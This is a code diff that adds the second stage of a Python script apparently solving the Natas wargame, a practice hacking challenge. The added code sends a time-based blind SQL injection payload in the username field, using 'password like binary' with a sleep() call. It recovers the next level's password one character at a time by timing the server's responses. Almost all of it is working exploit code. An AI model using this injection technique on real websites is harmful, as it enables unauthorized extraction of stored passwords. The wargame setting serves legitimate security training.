@@ -75,3 +75,21 @@ for char in possible_chars:
         password_chars += char
         print(f'password_chars: {password_chars}', end='\r')
 print('\n')
+
+
+# STEP 2: get the password
+password = ""
+for i in range(32):
+    for char in password_chars:
+        print(f'password: {password + char}', end='\r')
+        data = {
+            'username' : f'natas18" and password like binary "{password + char}%" and sleep({SLEEP_SECONDS}) # A ',
+            "submit" : 'submit'
+        }
+        response = session.post(URL, data=data)
+        if response.elapsed.total_seconds() >= SLEEP_SECONDS:
+            password += char
+            print(f'password: {password}', end='\r')
+            break
+
+
